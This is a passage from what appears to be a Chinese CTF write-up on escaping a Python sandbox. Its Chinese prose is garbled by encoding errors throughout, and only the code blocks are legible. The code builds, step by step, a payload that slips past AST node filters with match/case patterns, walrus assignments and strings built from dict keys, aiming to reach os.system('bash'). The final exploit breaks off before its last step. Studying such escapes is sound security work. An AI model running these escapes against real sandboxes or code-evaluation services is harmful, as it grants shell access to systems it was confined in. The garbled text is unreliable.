<p>BUILTINS ä¸­èƒ½å¤Ÿä½¿ç”¨çš„å‡½æ•°éƒ½ä¸å…·å¤‡ RCE æˆ–è€…æ“ä½œæ–‡ä»¶ç³»ç»Ÿçš„åŠŸèƒ½ï¼Œé‚£ä¹ˆæˆ‘ä»¬çš„æ€è·¯å°±æ˜¯ç»•è¿‡ no builtinsã€‚</p>

<p>æ„é€ :</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span> <span class="n">x</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">_wrap_close</span><span class="sh">"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">](</span><span class="sh">"</span><span class="s">bash</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="ç»•è¿‡-astattribute-è·å–å±æ€§">ç»•è¿‡ ast.Attribute è·å–å±æ€§</h3>
<p>å¦‚ä½•ç»•è¿‡ ast.Attributeï¼Ÿpython 3.10 ä¸­å¼•å…¥äº†ä¸€ä¸ªæ–°çš„ç‰¹æ€§ï¼šmatch/caseï¼Œç±»ä¼¼å…¶ä»–è¯­è¨€ä¸­çš„ switch/caseï¼Œä½† match/case æ›´åŠ å¼ºå¤§ï¼Œé™¤äº†å¯ä»¥åŒ¹é…æ•°å­—å­—ç¬¦ä¸²ä¹‹å¤–ï¼Œè¿˜å¯ä»¥åŒ¹é…å­—å…¸ã€å¯¹è±¡ç­‰ã€‚</p>

<p>æœ€ç®€å•çš„ç¤ºä¾‹ï¼ŒåŒ¹é…å­—ç¬¦ä¸²ï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">item</span> <span class="o">=</span> <span class="mi">2</span>

<span class="n">match</span> <span class="n">item</span><span class="p">:</span>
    <span class="n">case</span> <span class="mi">1</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">One</span><span class="sh">"</span><span class="p">)</span>
    <span class="n">case</span> <span class="mi">2</span><span class="p">:</span>
        <span class="nf">print</span><span class="p">(</span><span class="sh">"</span><span class="s">Two</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># Two
</span></code></pre></div></div>
<p>è¿˜å¯ä»¥åŒ¹é…å¹¶è‡ªåŠ¨èµ‹å€¼ç»™å±€éƒ¨å˜é‡ï¼Œä¼ å…¥ (1,2) æ—¶ï¼Œä¼šè¿›å…¥ç¬¬äºŒä¸ªåˆ†æ”¯ï¼Œå¹¶å¯¹ x,y èµ‹å€¼ã€‚</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">item</span> <span class="o">=</span> <span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>

<span class="n">match</span> <span class="n">item</span><span class="p">:</span>
    <span class="nf">case </span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">z</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">y</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">z</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">case </span><span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="s"> </span><span class="si">{</span><span class="n">y</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
    <span class="nf">case </span><span class="p">(</span><span class="n">x</span><span class="p">,):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="si">{</span><span class="n">x</span><span class="si">}</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>
<p>å¯¹äºåŸºæœ¬ç±»å‹çš„åŒ¹é…æ¯”è¾ƒå¥½ç†è§£ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªåŒ¹é…ç±»çš„ç¤ºä¾‹ï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">class</span> <span class="nc">AClass</span><span class="p">:</span>
    <span class="k">def</span> <span class="nf">__init__</span><span class="p">(</span><span class="n">self</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
        <span class="n">self</span><span class="p">.</span><span class="n">thing</span> <span class="o">=</span> <span class="n">value</span>

<span class="n">item</span> <span class="o">=</span> <span class="nc">AClass</span><span class="p">(</span><span class="mi">32</span><span class="p">)</span>

<span class="n">match</span> <span class="n">item</span><span class="p">:</span>
    <span class="n">case</span> <span class="nc">AClass</span><span class="p">(</span><span class="n">thing</span><span class="o">=</span><span class="n">x</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="sa">f</span><span class="sh">"</span><span class="s">Got </span><span class="si">{</span><span class="n">x</span> <span class="o">=</span> <span class="si">}</span><span class="s">!</span><span class="sh">"</span><span class="p">)</span>

<span class="c1"># Got x = 32!
</span></code></pre></div></div>
<p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼Œé‡ç‚¹å…³æ³¨<code class="language-plaintext highlighter-rouge">case AClass(thing=x)</code>ï¼Œè¿™é‡Œçš„å«ä¹‰å¹¶éæ˜¯å°† x èµ‹å€¼ç»™ thingï¼Œæˆ‘ä»¬éœ€è¦å°†å…¶ç†è§£ä¸ºä¸€ä¸ªè¡¨è¾¾å¼ï¼Œè¡¨ç¤ºåŒ¹é…ç±»å‹ä¸º AClass ä¸”å­˜åœ¨ thing å±æ€§çš„å¯¹è±¡ï¼Œå¹¶ä¸” thing å±æ€§å€¼è‡ªåŠ¨èµ‹å€¼ç»™ xã€‚</p>

<p>è¿™æ ·ä¸€æ¥å°±å¯ä»¥åœ¨ä¸é€‚ç”¨ . å·çš„æƒ…å†µä¸‹è·å–åˆ°ç±»çš„å±æ€§å€¼ã€‚ä¾‹å¦‚è·å– <code class="language-plaintext highlighter-rouge">''.__class__</code>ï¼Œæˆ‘ä»¬å¯ä»¥ç¼–å†™å¦‚ä¸‹çš„ match/case è¯­å¥ï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nf">str</span><span class="p">():</span>
    <span class="n">case</span> <span class="nf">str</span><span class="p">(</span><span class="n">__class__</span><span class="o">=</span><span class="n">x</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="o">==</span><span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">)</span>

<span class="c1"># True
</span></code></pre></div></div>
<p>å¯ä»¥çœ‹åˆ° x å°±æ˜¯ <code class="language-plaintext highlighter-rouge">''.__class__</code>. å› ä¸ºæ‰€æœ‰çš„ç±»éƒ½è¾“å…¥ object ç±»ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ object æ¥æ›¿ä»£ strï¼Œè¿™æ ·å°±æ— éœ€å…³æ³¨åŒ¹é…åˆ°çš„åˆ°åº•æ˜¯å“ªä¸ªç±»ã€‚</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nf">str</span><span class="p">():</span>
    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">__class__</span><span class="o">=</span><span class="n">x</span><span class="p">):</span>
        <span class="nf">print</span><span class="p">(</span><span class="n">x</span><span class="o">==</span><span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">)</span>

<span class="c1"># True
</span></code></pre></div></div>

<p>å†æµ‹è¯•ä¸€ä¸‹è¯¥ payload çš„ ASTï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="n">os</span>
<span class="kn">import</span> <span class="n">ast</span> 

<span class="n">a</span> <span class="o">=</span> <span class="sh">'''</span><span class="s">
match str():
    case str(__class__=x):
        print(x)
</span><span class="sh">'''</span>
<span class="nf">print</span><span class="p">(</span><span class="n">ast</span><span class="p">.</span><span class="nf">dump</span><span class="p">(</span><span class="n">ast</span><span class="p">.</span><span class="nf">parse</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">mode</span><span class="o">=</span><span class="sh">'</span><span class="s">exec</span><span class="sh">'</span><span class="p">),</span> <span class="n">indent</span><span class="o">=</span><span class="mi">4</span><span class="p">))</span>
</code></pre></div></div>
<p>AST å¦‚ä¸‹ï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Module</span><span class="p">(</span>
    <span class="n">body</span><span class="o">=</span><span class="p">[</span>
        <span class="nc">Match</span><span class="p">(</span>
            <span class="n">subject</span><span class="o">=</span><span class="nc">Call</span><span class="p">(</span>
                <span class="n">func</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">str</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">()),</span>
                <span class="n">args</span><span class="o">=</span><span class="p">[],</span>
                <span class="n">keywords</span><span class="o">=</span><span class="p">[]),</span>
            <span class="n">cases</span><span class="o">=</span><span class="p">[</span>
                <span class="nf">match_case</span><span class="p">(</span>
                    <span class="n">pattern</span><span class="o">=</span><span class="nc">MatchClass</span><span class="p">(</span>
                        <span class="n">cls</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">str</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">()),</span>
                        <span class="n">patterns</span><span class="o">=</span><span class="p">[],</span>
                        <span class="n">kwd_attrs</span><span class="o">=</span><span class="p">[</span>
                            <span class="sh">'</span><span class="s">__class__</span><span class="sh">'</span><span class="p">],</span>
                        <span class="n">kwd_patterns</span><span class="o">=</span><span class="p">[</span>
                            <span class="nc">MatchAs</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">)]),</span>
                    <span class="n">body</span><span class="o">=</span><span class="p">[</span>
                        <span class="nc">Expr</span><span class="p">(</span>
                            <span class="n">value</span><span class="o">=</span><span class="nc">Call</span><span class="p">(</span>
                                <span class="n">func</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">print</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">()),</span>
                                <span class="n">args</span><span class="o">=</span><span class="p">[</span>
                                    <span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">x</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">())],</span>
                                <span class="n">keywords</span><span class="o">=</span><span class="p">[]))])])],</span>
    <span class="n">type_ignores</span><span class="o">=</span><span class="p">[])</span>
</code></pre></div></div>
<p>å¯ä»¥çœ‹åˆ°ç¡®å®æ²¡æœ‰ Attributeï¼Œä¾æ®è¿™ä¸ªåŸç†ï¼Œå°±å¯ä»¥ç»•è¿‡ ast.Attribute</p>

<p>æˆ‘ä»¬å¯ä»¥æ„é€ æ›¿ä»£ <code class="language-plaintext highlighter-rouge">''.__class__.__base__.__subclasses__()</code>çš„ payloadï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nf">str</span><span class="p">():</span>
    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">__class__</span><span class="o">=</span><span class="n">clazz</span><span class="p">):</span>
        <span class="n">match</span> <span class="n">clazz</span><span class="p">:</span>
            <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">__base__</span><span class="o">=</span><span class="n">bass</span><span class="p">):</span>
                <span class="n">match</span> <span class="n">bass</span><span class="p">:</span>
                    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">__subclasses__</span><span class="o">=</span><span class="n">subclazz</span><span class="p">):</span>
                        <span class="nf">print</span><span class="p">(</span><span class="n">subclazz</span><span class="p">)</span>
</code></pre></div></div>
<h3 id="ç»•è¿‡-astassign-èµ‹å€¼å˜é‡">ç»•è¿‡ ast.Assign èµ‹å€¼å˜é‡</h3>
<p>ast.Assign æ— æ³•ä½¿ç”¨æ—¶ï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥ä½¿ç”¨ = æ¥è¿›è¡Œèµ‹å€¼ï¼Œæ­¤æ—¶å¯ä»¥ä½¿ç”¨æµ·è±¡è¡¨è¾¾å¼è¿›è¡Œç»•è¿‡ã€‚ä¾‹å¦‚ï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span>
    <span class="n">system</span><span class="p">:</span><span class="o">=</span><span class="mi">111</span><span class="p">,</span>
    <span class="n">bash</span><span class="p">:</span><span class="o">=</span><span class="mi">222</span>
<span class="p">]</span>
</code></pre></div></div>
<p>æ­¤æ—¶ AST æ ‘å¦‚ä¸‹,æµ·è±¡è¡¨è¾¾å¼ç”¨åˆ°çš„æ˜¯ ast.NamedExpr è€Œé ast.Assign</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">Module</span><span class="p">(</span>
    <span class="n">body</span><span class="o">=</span><span class="p">[</span>
        <span class="nc">Expr</span><span class="p">(</span>
            <span class="n">value</span><span class="o">=</span><span class="nc">List</span><span class="p">(</span>
                <span class="n">elts</span><span class="o">=</span><span class="p">[</span>
                    <span class="nc">NamedExpr</span><span class="p">(</span>
                        <span class="n">target</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">system</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Store</span><span class="p">()),</span>
                        <span class="n">value</span><span class="o">=</span><span class="nc">Constant</span><span class="p">(</span><span class="n">value</span><span class="o">=</span><span class="mi">111</span><span class="p">)),</span>
                    <span class="nc">NamedExpr</span><span class="p">(</span>
                        <span class="n">target</span><span class="o">=</span><span class="nc">Name</span><span class="p">(</span><span class="nb">id</span><span class="o">=</span><span class="sh">'</span><span class="s">bash</span><span class="sh">'</span><span class="p">,</span> <span class="n">ctx</span><span class="o">=</span><span class="nc">Store</span><span class="p">()),</span>
                        <span class="n">value</span><span class="o">=</span><span class="nc">Constant</span><span class="p">(</span><span class="n">value</span><span class="o">=</span><span class="mi">222</span><span class="p">))],</span>
                <span class="n">ctx</span><span class="o">=</span><span class="nc">Load</span><span class="p">()))],</span>
    <span class="n">type_ignores</span><span class="o">=</span><span class="p">[])</span>
</code></pre></div></div>

<h3 id="ç»•è¿‡-astconstant-è·å–æ•°å­—å­—ç¬¦ä¸²">ç»•è¿‡ ast.Constant è·å–æ•°å­—ã€å­—ç¬¦ä¸²</h3>
<p>é¢˜ç›®é™åˆ¶äº† ast.Constantï¼Œæ‰€ä»¥æˆ‘ä»¬æ— æ³•ç›´æ¥ä½¿ç”¨æ•°å­—ã€å­—ç¬¦ä¸²å¸¸é‡ï¼Œä½†é€šè¿‡å…¶ä»–çš„å‡½æ•°ç»„åˆæˆ‘ä»¬å¯ä»¥æ„é€ å‡ºæ•°å­—å’Œå­—ç¬¦ä¸²ã€‚
ä¾‹å¦‚ï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="sh">""</span> <span class="p">:</span> <span class="nf">str</span><span class="p">()</span>
<span class="mi">0</span>  <span class="p">:</span> <span class="nf">len</span><span class="p">([])</span>
<span class="sh">"</span><span class="s">0</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([]))</span>
<span class="sh">"</span><span class="s">1</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nf">str</span><span class="p">()]))</span> <span class="n">æˆ–</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nb">min</span><span class="p">]))</span>
<span class="sh">"</span><span class="s">2</span><span class="sh">"</span><span class="p">:</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nf">str</span><span class="p">(),</span><span class="nf">str</span><span class="p">()]))</span> <span class="n">æˆ–</span> <span class="nf">str</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nb">min</span><span class="p">,</span><span class="nb">max</span><span class="p">]))</span>
<span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="p">:</span> <span class="nf">chr</span><span class="p">(</span><span class="nf">len</span><span class="p">([</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">])</span><span class="o">*</span><span class="nf">len</span><span class="p">([</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">,</span><span class="nb">min</span><span class="p">]))</span>
</code></pre></div></div>
<p>å¦‚æœè¦ç”¨æ•°å­—æ¥æ„é€ å­—ç¬¦ä¸²ï¼Œé€šå¸¸éœ€è¦ç”¨åˆ° chr å‡½æ•°ï¼Œè™½ç„¶é¢˜ç›®çš„ builtins æ²¡æœ‰ç›´æ¥æä¾› chr å‡½æ•°ï¼Œä½†æˆ‘ä»¬ä¹Ÿå¯ä»¥è‡ªå·±æ‰‹åŠ¨å®ç°ä¸€ä¸ª chrã€‚</p>

<p>å½“ç„¶ï¼Œé¢˜ç›® builtins å…è®¸ dict å’Œ listï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥ç”¨è¿™ä¸¤ä¸ªå‡½æ•°ç›´æ¥æ„é€ å‡ºå­—ç¬¦ä¸²ï¼Œè¿™ç§æ–¹å¼åœ¨æˆ‘æ­¤å‰çš„åšå®¢ï¼š<a href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-02-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2%E7%BB%95%E8%BF%87.html#list--dict">pyjail bypass-02 ç»•è¿‡åŸºäºå­—ç¬¦ä¸²åŒ¹é…çš„è¿‡æ»¤</a> ä¸­æœ‰æåˆ°è¿‡ã€‚</p>

<p>åœ¨è¿™ä¸ª payload ä¸­ï¼Œæˆ‘ä»¬éœ€è¦æ„é€ å‡º _wrap_closeã€systemã€bash</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span> <span class="n">x</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">_wrap_close</span><span class="sh">"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">](</span><span class="sh">"</span><span class="s">bash</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>
<p>é‚£ä¹ˆæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼è·å–åˆ°è¿™å‡ ä¸ªå­—ç¬¦ä¸²ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>list<span class="o">(</span>dict<span class="o">(</span><span class="nv">system</span><span class="o">=[]))[</span>0]            <span class="c"># system</span>
list<span class="o">(</span>dict<span class="o">(</span><span class="nv">_wrap_close</span><span class="o">=[]))[</span>0]       <span class="c"># _wrap_close</span>
list<span class="o">(</span>dict<span class="o">(</span><span class="nv">bash</span><span class="o">=[]))[</span>0]              <span class="c"># bash</span>
</code></pre></div></div>

<h3 id="ç»•è¿‡-astsubscript-è·å–åˆ—è¡¨å­—å…¸å…ƒç´ ">ç»•è¿‡ ast.Subscript è·å–åˆ—è¡¨/å­—å…¸å…ƒç´ </h3>
<p>é¢˜ç›®åŒæ—¶é™å®šäº† ast.Subscriptï¼Œæˆ‘ä»¬æ— æ³•ç›´æ¥ä½¿ç”¨ç´¢å¼•ã€‚ä½† BUILTINS ä¸­ç»™å‡ºäº† min å‡½æ•°ï¼Œè¯¥å‡½æ•°å¯ä»¥è·å–åˆ—è¡¨ä¸­æœ€å°çš„å…ƒç´ ï¼Œå½“åˆ—è¡¨ä¸­åªæœ‰ä¸€ä¸ªå…ƒç´ æ—¶ï¼Œå°±å¯ä»¥ç›´æ¥å–å€¼ã€‚</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">system</span><span class="o">=</span><span class="p">[])))</span>            <span class="c1"># system
</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">_wrap_close</span><span class="o">=</span><span class="p">[])))</span>       <span class="c1"># _wrap_close
</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">bash</span><span class="o">=</span><span class="p">[])))</span>              <span class="c1"># bash
</span></code></pre></div></div>

<p>å¦‚æœè¦è·å–å­—å…¸å…ƒç´ ï¼Œå¯ä»¥åˆ©ç”¨ get å‡½æ•°æ¥æ›¿ä»£ Subscriptã€‚ä¾‹å¦‚æˆ‘éœ€è¦åœ¨ globals å­—å…¸ä¸­è·å– key ä¸º system çš„å…ƒç´ ï¼Œå¯ä»¥é…åˆ match/case æ¥è·å–ã€‚</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nb">globals</span><span class="p">:</span>
    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">get</span><span class="o">=</span><span class="n">get_func</span><span class="p">):</span>
        <span class="nf">get_func</span><span class="p">(</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>

<h3 id="ç»•è¿‡-astfor-éå†åˆ—è¡¨">ç»•è¿‡ ast.For éå†åˆ—è¡¨</h3>
<p>åœ¨æ„é€ æœ€ç»ˆ payload ä¸­ï¼Œæˆ‘ä»¬è¿˜éœ€è¦åœ¨ <code class="language-plaintext highlighter-rouge">__subclasses__()</code>å¾—åˆ°çš„åˆ—è¡¨ä¸­è·å–åˆ° _wrap_close ç±»ã€‚</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="p">[</span> <span class="n">x</span><span class="p">.</span><span class="n">__init__</span><span class="p">.</span><span class="n">__globals__</span> <span class="k">for</span> <span class="n">x</span> <span class="ow">in</span> <span class="sh">''</span><span class="p">.</span><span class="n">__class__</span><span class="p">.</span><span class="n">__base__</span><span class="p">.</span><span class="nf">__subclasses__</span><span class="p">()</span> <span class="k">if</span> <span class="n">x</span><span class="p">.</span><span class="n">__name__</span><span class="o">==</span><span class="sh">"</span><span class="s">_wrap_close</span><span class="sh">"</span><span class="p">][</span><span class="mi">0</span><span class="p">][</span><span class="sh">"</span><span class="s">system</span><span class="sh">"</span><span class="p">](</span><span class="sh">"</span><span class="s">bash</span><span class="sh">"</span><span class="p">)</span>
</code></pre></div></div>
<p>å½“åˆ—è¡¨ä¸­ä¸åªæœ‰ä¸€ä¸ªå…ƒç´ ä¸”åˆ—è¡¨ä¸­çš„å…ƒç´ ä¹‹é—´æ— æ³•æ¯”è¾ƒæ—¶ï¼Œæ­£å¸¸æƒ…å†µä¸‹å¯ä»¥ä½¿ç”¨ for æ¥éå†å¹¶åˆ¤æ–­ï¼Œä½† ast.For è¢«é¢˜ç›®è¿‡æ»¤äº†ï¼Œæ­¤æ—¶æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ filterï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">filter_func</span><span class="p">(</span><span class="n">subclazzes_item</span><span class="p">):</span>
    <span class="p">[</span> <span class="n">_wrap_close</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">_wrap_close</span><span class="o">=</span><span class="p">[])))]</span>
    <span class="n">match</span> <span class="n">subclazzes_item</span><span class="p">:</span>
        <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">ï¼¿</span><span class="n">name_</span><span class="err">ï¼¿</span><span class="o">=</span><span class="n">name</span><span class="p">):</span>
            <span class="k">if</span> <span class="n">name</span><span class="o">==</span><span class="n">_wrap_close</span><span class="p">:</span>
                <span class="k">return</span> <span class="n">subclazzes_item</span>
<span class="p">[</span>
    <span class="n">subclazzes_item</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="n">filter_func</span><span class="p">,</span><span class="nf">subclazzes</span><span class="p">()))</span>
<span class="p">]</span>
</code></pre></div></div>
<p>fitler ä¸­ä½¿ç”¨ match/case å’Œ if æ¥è¿›è¡Œè¿‡æ»¤ã€‚</p>

<p>é™¤äº†ä½¿ç”¨ filter å‡½æ•°å¤–ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ iter å’Œ next å‡½æ•°æ¥éå†åˆ—è¡¨ï¼Œä½†é¢˜ç›® BUILTINS ä¸­æ²¡æœ‰ç»™å‡ºè¿™ä¸¤ä¸ªå‡½æ•°ã€‚</p>

<h3 id="exp">EXP</h3>
<p>æ•´åˆäº†æ‰€æœ‰çš„ç»•è¿‡æ‰‹æ®µï¼Œå…¶å®å°±å¯ä»¥ç¼–å†™å‡º payload äº†ã€‚</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">match</span> <span class="nf">str</span><span class="p">():</span>
    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">ï¼¿</span><span class="n">class_</span><span class="err">ï¼¿</span><span class="o">=</span><span class="n">clazz</span><span class="p">):</span>
        <span class="n">match</span> <span class="n">clazz</span><span class="p">:</span>
            <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">ï¼¿</span><span class="n">base_</span><span class="err">ï¼¿</span><span class="o">=</span><span class="n">bass</span><span class="p">):</span>
                <span class="n">match</span> <span class="n">bass</span><span class="p">:</span>
                    <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">ï¼¿</span><span class="n">subclasses_</span><span class="err">ï¼¿</span><span class="o">=</span><span class="n">subclazzes</span><span class="p">):</span>
                        <span class="p">[</span>
                            <span class="n">system</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">system</span><span class="o">=</span><span class="p">[]))),</span>
                            <span class="n">bash</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">bash</span><span class="o">=</span><span class="p">[])))</span>
                        <span class="p">]</span>
                        <span class="k">def</span> <span class="nf">filter_func</span><span class="p">(</span><span class="n">subclazzes_item</span><span class="p">):</span>
                            <span class="p">[</span> <span class="n">_wrap_close</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">list</span><span class="p">(</span><span class="nf">dict</span><span class="p">(</span><span class="n">_wrap_close</span><span class="o">=</span><span class="p">[])))]</span>
                            <span class="n">match</span> <span class="n">subclazzes_item</span><span class="p">:</span>
                                <span class="n">case</span> <span class="nf">object</span><span class="p">(</span><span class="n">_</span><span class="err">ï¼¿</span><span class="n">name_</span><span class="err">ï¼¿</span><span class="o">=</span><span class="n">name</span><span class="p">):</span>
                                    <span class="k">if</span> <span class="n">name</span><span class="o">==</span><span class="n">_wrap_close</span><span class="p">:</span>
                                        <span class="k">return</span> <span class="n">subclazzes_item</span>
                        <span class="p">[</span>
                            <span class="n">subclazzes_item</span><span class="p">:</span><span class="o">=</span><span class="nf">min</span><span class="p">(</span><span class="nf">filter</span><span class="p">(</span><span class="n">filter_func</span><span class="p">,</span><span class="nf">subclazzes</span><span class="p">()))</span>
                        <span class="p">]</span>
